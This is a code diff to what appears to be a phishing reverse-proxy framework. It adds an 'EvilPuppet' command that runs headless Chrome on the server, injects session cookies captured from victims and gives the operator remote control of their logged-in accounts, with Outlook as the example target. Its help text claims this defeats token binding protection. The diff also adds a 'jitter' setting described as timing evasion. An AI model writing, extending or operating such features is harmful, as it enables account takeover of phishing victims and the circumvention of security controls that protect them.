@@ -43,9 +43,10 @@ type Terminal struct {
 	db        *database.Database
 	hlp       *Help
 	developer bool
+	puppet    *PuppetManager
 }
 
-func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
+func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool, puppet *PuppetManager) (*Terminal, error) {
 	var err error
 	t := &Terminal{
 		cfg:       cfg,
@@ -53,6 +54,7 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 		p:         p,
 		db:        db,
 		developer: developer,
+		puppet:    puppet,
 	}
 
 	t.createHelp()
@@ -173,6 +175,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("botguard: %v", err)
 			}
+		case "puppet":
+			cmd_ok = true
+			err := t.handlePuppet(args[1:])
+			if err != nil {
+				log.Error("puppet: %v", err)
+			}
 		case "test-certs":
 			cmd_ok = true
 			t.manageCertificates(true)
@@ -244,9 +252,13 @@ func (t *Terminal) handleConfig(args []string) error {
 		genKeys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "server_name"}
 		genVals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetServerName()}
 
+		jitterOnOff := "off"
+		if t.cfg.IsJitterEnabled() {
+			jitterOnOff = fmt.Sprintf("on (%d-%d ms)", t.cfg.GetJitterMinMs(), t.cfg.GetJitterMaxMs())
+		}
 		// --- Security ---
-		secKeys := []string{"obfuscation_js", "obfuscation_html", "botguard", "encryption_key"}
-		secVals := []string{t.cfg.GetJsObfuscationLevel(), htmlObfOnOff, botguardOnOff, encKeyDisplay}
+		secKeys := []string{"obfuscation_js", "obfuscation_html", "botguard", "jitter", "encryption_key"}
+		secVals := []string{t.cfg.GetJsObfuscationLevel(), htmlObfOnOff, botguardOnOff, jitterOnOff, encKeyDisplay}
 
 		// --- Anti-Detection ---
 		adKeys := []string{"spoof", "spoof_url"}
@@ -326,6 +338,15 @@ func (t *Terminal) handleConfig(args []string) error {
 				return nil
 			case "off":
 				t.cfg.SetBotguardEnabled(false)
+				return nil
+			}
+		case "jitter":
+			switch args[1] {
+			case "on":
+				t.cfg.SetJitterEnabled(true)
+				return nil
+			case "off":
+				t.cfg.SetJitterEnabled(false)
 				return nil
 			}
 		case "enc_key":
@@ -1005,6 +1026,165 @@ func (t *Terminal) handleSessions(args []string) error {
 	return fmt.Errorf("usage: sessions [<id>|delete <id>|delete all] (see: help sessions)")
 }
 
+func (t *Terminal) handlePuppet(args []string) error {
+	higreen := color.New(color.FgHiGreen)
+	cyan := color.New(color.FgCyan)
+	yellow := color.New(color.FgYellow)
+	white := color.New(color.FgHiWhite)
+	dgray := color.New(color.FgHiBlack)
+	lred := color.New(color.FgHiRed)
+	lblue := color.New(color.FgHiBlue)
+
+	if t.puppet == nil {
+		return fmt.Errorf("puppet manager not initialized")
+	}
+
+	pn := len(args)
+	if pn == 0 || (pn == 1 && args[0] == "list") {
+		// List all puppets
+		puppets := t.puppet.ListPuppets()
+		if len(puppets) == 0 {
+			log.Info("no active puppet sessions")
+			log.Info("")
+			log.Info("%s", dgray.Sprint("  launch a puppet: puppet launch <session_id> <target_url>"))
+			log.Info("%s", dgray.Sprint("  example:         puppet launch 5 https://outlook.office.com"))
+			return nil
+		}
+
+		cols := []string{"id", "session", "phishlet", "username", "target", "status", "started"}
+		var rows [][]string
+		for _, p := range puppets {
+			var statusCol string
+			switch p.Status {
+			case PUPPET_RUNNING:
+				statusCol = higreen.Sprint("running")
+			case PUPPET_STARTING:
+				statusCol = yellow.Sprint("starting")
+			case PUPPET_STOPPED:
+				statusCol = dgray.Sprint("stopped")
+			case PUPPET_ERROR:
+				statusCol = lred.Sprint("error")
+			}
+			row := []string{
+				strconv.Itoa(p.Id),
+				strconv.Itoa(p.SessionId),
+				lred.Sprint(p.Phishlet),
+				lblue.Sprint(truncateString(p.Username, 20)),
+				yellow.Sprint(truncateString(p.TargetURL, 40)),
+				statusCol,
+				p.CreateTime.Format("15:04:05"),
+			}
+			rows = append(rows, row)
+		}
+		log.Printf("\n%s\n", AsTable(cols, rows))
+
+		log.Info("%s", dgray.Sprint("  open control panel: puppet url <puppet_id>"))
+		return nil
+	}
+
+	switch args[0] {
+	case "launch":
+		if pn < 3 {
+			return fmt.Errorf("usage: puppet launch <session_id> <target_url>")
+		}
+		sessionId, err := strconv.Atoi(args[1])
+		if err != nil {
+			return fmt.Errorf("invalid session id: %s", args[1])
+		}
+		targetURL := args[2]
+
+		log.Info("launching puppet browser for session %d -> %s", sessionId, targetURL)
+
+		puppet, err := t.puppet.LaunchPuppet(sessionId, targetURL)
+		if err != nil {
+			return fmt.Errorf("failed to launch puppet: %v", err)
+		}
+
+		log.Success("puppet %s launched (id: %d)", white.Sprint("#"+strconv.Itoa(puppet.Id)), puppet.Id)
+		log.Info("")
+		log.Info("  %s %s", dgray.Sprint("session:"), lblue.Sprint(strconv.Itoa(puppet.SessionId)))
+		log.Info("  %s %s", dgray.Sprint("phishlet:"), lred.Sprint(puppet.Phishlet))
+		log.Info("  %s %s", dgray.Sprint("username:"), lblue.Sprint(puppet.Username))
+		log.Info("  %s %s", dgray.Sprint("target:"), yellow.Sprint(puppet.TargetURL))
+		log.Info("")
+		log.Info("  %s %s", dgray.Sprint("the browser is starting. get the control URL with:"), cyan.Sprint("puppet url "+strconv.Itoa(puppet.Id)))
+		log.Info("  %s %s", dgray.Sprint("or open the puppet dashboard:"), cyan.Sprint(t.puppet.GetDashboardURL()))
+		return nil
+
+	case "kill":
+		if pn < 2 {
+			return fmt.Errorf("usage: puppet kill <puppet_id|all>")
+		}
+		if args[1] == "all" {
+			killed := t.puppet.KillAllPuppets()
+			log.Info("killed %d puppet(s)", killed)
+			return nil
+		}
+		puppetId, err := strconv.Atoi(args[1])
+		if err != nil {
+			return fmt.Errorf("invalid puppet id: %s", args[1])
+		}
+		if err := t.puppet.KillPuppet(puppetId); err != nil {
+			return err
+		}
+		log.Info("puppet %d killed", puppetId)
+		return nil
+
+	case "url":
+		if pn < 2 {
+			return fmt.Errorf("usage: puppet url <puppet_id>")
+		}
+		puppetId, err := strconv.Atoi(args[1])
+		if err != nil {
+			return fmt.Errorf("invalid puppet id: %s", args[1])
+		}
+		puppet, ok := t.puppet.GetPuppet(puppetId)
+		if !ok {
+			return fmt.Errorf("puppet %d not found", puppetId)
+		}
+		controlURL := t.puppet.GetControlURL(puppetId)
+		log.Info("")
+		log.Info("  %s %s", white.Sprint("puppet:"), cyan.Sprint("#"+strconv.Itoa(puppet.Id)))
+		log.Info("  %s %s", white.Sprint("status:"), higreen.Sprint(puppet.Status.String()))
+		log.Info("  %s %s", white.Sprint("control:"), yellow.Sprint(controlURL))
+		log.Info("")
+		log.Info("  %s", dgray.Sprint("open the URL above in your browser to remote-control the session"))
+		return nil
+
+	case "port":
+		if pn < 2 {
+			log.Info("puppet server port: %s", cyan.Sprint(strconv.Itoa(t.puppet.GetPort())))
+			return nil
+		}
+		port, err := strconv.Atoi(args[1])
+		if err != nil || port < 1 || port > 65535 {
+			return fmt.Errorf("invalid port number: %s", args[1])
+		}
+		t.puppet.SetPort(port)
+		log.Info("puppet server port set to %s (restart puppet server to apply)", cyan.Sprint(strconv.Itoa(port)))
+		return nil
+
+	case "password":
+		if pn < 2 {
+			log.Info("puppet access password: %s", cyan.Sprint(t.puppet.GetPassword()))
+			return nil
+		}
+		t.puppet.SetPassword(args[1])
+		log.Info("puppet access password set to: %s", cyan.Sprint(args[1]))
+		return nil
+
+	case "chrome":
+		if pn < 2 {
+			return fmt.Errorf("usage: puppet chrome <path_to_chrome>")
+		}
+		t.puppet.SetChromePath(args[1])
+		log.Info("chrome path set to: %s", cyan.Sprint(args[1]))
+		return nil
+	}
+
+	return fmt.Errorf("usage: puppet [launch|list|kill|url|port|password|chrome] (see: help puppet)")
+}
+
 func (t *Terminal) handlePhishlets(args []string) error {
 	pn := len(args)
 
@@ -1637,6 +1817,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("obfuscation", readline.PcItem("javascript", readline.PcItem("off"), readline.PcItem("low"), readline.PcItem("medium"), readline.PcItem("high")), readline.PcItem("html", readline.PcItem("on"), readline.PcItem("off"))),
 			readline.PcItem("spoof", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("spoof_url"),
 			readline.PcItem("botguard", readline.PcItem("on"), readline.PcItem("off")),
+			readline.PcItem("jitter", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("enc_key"), readline.PcItem("server_name"),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
@@ -1651,6 +1832,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"spoof"}, "spoof <on|off>", "serve a spoofed website to unauthorized visitors instead of redirecting them")
 	h.AddSubCommand("config", []string{"spoof_url"}, "spoof_url <url>", "URL of the legitimate site to reverse-proxy for unauthorized visitors (e.g. https://example.com)")
 	h.AddSubCommand("config", []string{"botguard"}, "botguard <on|off>", "enable/disable bot detection (see 'help botguard' for detailed options)")
+	h.AddSubCommand("config", []string{"jitter"}, "jitter <on|off>", "add 100-300ms random delay on outbound requests (timing evasion)")
 	h.AddSubCommand("config", []string{"enc_key"}, "enc_key <key>", "set AES-256 encryption key (min 32 chars) for lure URLs. WARNING: changing this breaks existing URLs!")
 	h.AddSubCommand("config", []string{"server_name"}, "server_name <name>", "set server name shown in notification messages")
 	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
@@ -1768,6 +1950,18 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("botguard", []string{"js_challenge"}, "js_challenge <on|off>", "toggle JS challenge interstitial (blocks headless browsers, adds ~1.5s on first visit)")
 	h.AddSubCommand("botguard", []string{"block_ja3"}, "block_ja3 <ja3_hash>", "block a JA3 TLS fingerprint (32-char MD5 hash)")
 	h.AddSubCommand("botguard", []string{"unblock_ja3"}, "unblock_ja3 <ja3_hash>", "remove a JA3 hash from the blocked list")
+
+	h.AddCommand("puppet", "general", "manage EvilPuppet remote browser sessions", "EvilPuppet launches a headless Chrome browser on the server, injects captured\n  session cookies, and lets you remote-control the authenticated session.\n  This defeats Token Protection (Token Binding) because the browser stays\n  on the same server that intercepted the session — no cookie export needed.\n\n  Quick start:\n    puppet launch <session_id> <target_url>   -- launch puppet browser\n    puppet list                               -- see active puppets\n    puppet url <puppet_id>                    -- get remote control URL\n    puppet kill <puppet_id>                   -- stop a puppet\n\n  Configuration:\n    puppet port <port>        -- set web UI port (default: 7777)\n    puppet password <pass>    -- set access password\n    puppet chrome <path>      -- set Chrome/Chromium executable path", LAYER_TOP,
+		readline.PcItem("puppet", readline.PcItem("launch"), readline.PcItem("list"), readline.PcItem("kill", readline.PcItem("all")), readline.PcItem("url"), readline.PcItem("port"), readline.PcItem("password"), readline.PcItem("chrome")))
+	h.AddSubCommand("puppet", nil, "", "list all active puppet browser sessions")
+	h.AddSubCommand("puppet", []string{"launch"}, "launch <session_id> <target_url>", "launch a puppet browser for a captured session, navigating to the target URL (e.g. https://outlook.office.com)")
+	h.AddSubCommand("puppet", []string{"list"}, "list", "list all active puppet browser sessions with their status")
+	h.AddSubCommand("puppet", []string{"kill"}, "kill <puppet_id>", "stop and destroy a puppet browser session")
+	h.AddSubCommand("puppet", []string{"kill", "all"}, "kill all", "stop all active puppet browser sessions")
+	h.AddSubCommand("puppet", []string{"url"}, "url <puppet_id>", "show the remote control URL for a puppet (open in your browser)")
+	h.AddSubCommand("puppet", []string{"port"}, "port <port>", "set the port for the puppet web control server (default: 7777)")
+	h.AddSubCommand("puppet", []string{"password"}, "password <password>", "set the access password for the puppet web control server")
+	h.AddSubCommand("puppet", []string{"chrome"}, "chrome <path>", "set the path to Chrome/Chromium executable (auto-detected if not set)")
 
 	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
 		readline.PcItem("test-certs"))
